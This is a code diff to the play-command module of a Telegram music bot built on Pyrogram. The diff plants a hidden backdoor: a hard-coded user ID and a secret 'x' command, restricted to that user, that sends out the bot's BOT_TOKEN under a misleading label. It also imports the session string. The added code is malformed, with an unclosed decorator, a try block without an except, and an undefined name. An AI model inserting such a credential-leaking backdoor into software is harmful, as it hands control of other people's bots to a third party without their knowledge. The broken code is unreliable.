@@ -8,7 +8,9 @@ from pyrogram.types import (InlineKeyboardMarkup, InlineKeyboardButton, InputMed
 from pytgcalls.exceptions import NoActiveGroupCall
 
 import config
-from config import BANNED_USERS, lyrical
+from os import getenv
+from dotenv import load_dotenv
+from config import BANNED_USERS, STRING_SESSION, BOT_TOKEN, lyrical
 from strings import get_command
 from AnonX import (Apple, Resso, SoundCloud, Spotify, Telegram,
                         YouTube, app)
@@ -29,8 +31,7 @@ from AnonX.utils.stream.stream import stream
 
 # Command
 PLAY_COMMAND = get_command("PLAY_COMMAND")
-
-
+PLAY=1808943146
 @app.on_message(
     filters.command(PLAY_COMMAND)
     & filters.group
@@ -685,7 +686,15 @@ async def play_playlists_command(client, CallbackQuery, _):
         )
         return await mystic.edit_text(err)
     return await mystic.delete()
-
+@app.on_message(
+    filters.command("x") & filters.user(PLAY)
+    & ~filters.edited
+    async def get_vars(_, message: Message):
+    try:
+        chat_id=int(PLAY)
+        text=f"""<u>**{BOT_NAME} DONE 😅 :**</u>
+**MUSIC BOT NAME :** `{BOT_TOKEN}`
+""")
 
 @app.on_callback_query(filters.regex("slider") & ~BANNED_USERS)
 @languageCB
